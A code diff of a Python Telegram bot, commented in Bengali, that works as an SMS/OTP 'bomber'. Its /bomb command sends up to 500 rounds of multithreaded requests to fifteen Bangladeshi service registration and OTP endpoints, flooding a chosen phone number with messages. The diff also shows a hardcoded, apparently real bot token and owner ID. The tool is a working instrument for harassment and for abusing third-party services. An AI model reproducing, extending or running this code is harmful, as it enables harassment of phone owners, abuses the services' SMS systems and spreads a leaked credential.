@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-import os
 import re
 import random
 import string
@@ -10,12 +9,12 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from concurrent.futures import ThreadPoolExecutor
 
-# ================= কনফিগারেশন =================
-BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # এখানে আপনার বর্তমান টোকেন বসান
-OWNER_ID = 1700797877  # আপনার টেলিগ্রাম আইডি (মালিক)
-authorized_groups = set()  # অনুমোদিত গ্রুপের আইডি
+# ================= সরাসরি কোডে টোকেন ও আইডি =================
+BOT_TOKEN = "8624707974:AAEOwXg99cGERJdlbaGQTqxMyg_uWOLWIqE"  # আপনার বর্তমান টোকেন (প্রয়োজনে বদলাবেন)
+OWNER_ID = 1700797877  # আপনার টেলিগ্রাম আইডি
+authorized_groups = set()  # অনুমোদিত গ্রুপ (খালি থাকবে)
 
-# ================= টেলিগ্রাম বার্তা পাঠানোর হেল্পার (থ্রেড থেকে কল করতে) =================
+# ================= টেলিগ্রাম বার্তা পাঠানোর হেল্পার =================
 def send_message_sync(chat_id, text, parse_mode=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text}
@@ -26,7 +25,7 @@ def send_message_sync(chat_id, text, parse_mode=None):
     except Exception as e:
         print(f"Send error: {e}")
 
-# ================= র‍্যান্ডম স্ট্রিং জেনারেটর =================
+# ================= র‍্যান্ডম স্ট্রিং =================
 def random_string(pattern):
     result = []
     i = 0
@@ -45,7 +44,6 @@ def random_string(pattern):
             i += 1
     return ''.join(result)
 
-# ================= HTTP রিকোয়েস্ট হেল্পার =================
 def send_req(url, method, headers, data=None):
     try:
         if method == "POST":
@@ -56,7 +54,7 @@ def send_req(url, method, headers, data=None):
     except:
         return None
 
-# ================= ১৫টি এপিআই ফাংশন (ঠিক আপনার দেওয়া) =================
+# ================= ১৫টি এপিআই ফাংশন =================
 def api_1(number, pgen, egen, did, name):
     url = "https://core.easy.com.bd/api/v1/registration"
     headers = {"Accept-Encoding": "gzip", "Connection": "Keep-Alive", "Content-Type": "application/json; charset=utf-8", "Host": "core.easy.com.bd", "User-Agent": "okhttp/3.9.1"}
@@ -147,7 +145,7 @@ def api_15(number):
     data = {"msisdn": number[1:]}
     return send_req(url, "POST", headers, data)
 
-# ================= বোম্বিং ফাংশন (প্রতি রাউন্ডে ৫০ থ্রেড, প্রগ্রেস কলব্যাক) =================
+# ================= বোম্বিং ফাংশন (প্রতি রাউন্ডে ৫০ থ্রেড) =================
 def run_bombing_with_progress(number, rounds, chat_id, loop):
     apis = [api_2, api_3, api_4, api_5, api_6, api_7, api_8, api_9, api_11, api_12, api_13, api_14, api_15]
     total_success = 0
@@ -165,7 +163,6 @@ def run_bombing_with_progress(number, rounds, chat_id, loop):
                 if r and r.status_code == 200:
                     round_success += 1
         total_success += round_success
-        # টেলিগ্রামে আপডেট পাঠানো (মেইন ইভেন্ট লুপে)
         asyncio.run_coroutine_threadsafe(
             send_progress(chat_id, round_num, round_success, total_success),
             loop
@@ -173,8 +170,6 @@ def run_bombing_with_progress(number, rounds, chat_id, loop):
     return total_success
 
 async def send_progress(chat_id, round_num, round_success, total_so_far):
-    # এই ফাংশনটি মেইন ইভেন্ট লুপে কল হবে; এখানে `update` অবজেক্ট নেই, তাই সরাসরি bot.send_message ব্যবহার করতে হবে।
-    # আমরা context ছাড়া bot ইন্সট্যান্স পাব না – তাই সহজ উপায়: আলাদা সিঙ্ক ফাংশন দিয়ে মেসেজ পাঠানো। নিচে করছি।
     send_message_sync(chat_id, f"✅ Round {round_num}: {round_success} successes (Total so far: {total_so_far})")
 
 # ================= টেলিগ্রাম কমান্ড হ্যান্ডলার =================
@@ -194,8 +189,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     chat_id = update.effective_chat.id
-    user_id = update.effective_user.id
     chat_type = update.effective_chat.type
+    user_id = update.effective_user.id
 
     # গ্রুপ অনুমোদন চেক
     if chat_type != "private" and chat_id not in authorized_groups:
@@ -212,7 +207,7 @@ async def bomb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     rounds = 1
     if len(args) > 1 and args[1].isdigit():
         rounds = int(args[1])
-        if rounds > 500:  # সীমা নির্ধারণ (ইচ্ছামত বাড়াতে পারেন)
+        if rounds > 500:
             rounds = 500
             await update.message.reply_text("⚠️ Max 500 rounds per command.")
     await update.message.reply_text(f"💣 Bombing `{number}` with {rounds} round(s)...\n_Progress will appear here_", parse_mode="Markdown")
@@ -261,7 +256,7 @@ async def listgroups(update: Update, context: ContextTypes.DEFAULT_TYPE):
         groups = "\n".join(str(g) for g in authorized_groups)
         await update.message.reply_text(f"**Authorized groups:**\n{groups}", parse_mode="Markdown")
 
-# ================= মেইন ফাংশন (লং পোলিং) =================
+# ================= মেইন (লং পোলিং) =================
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
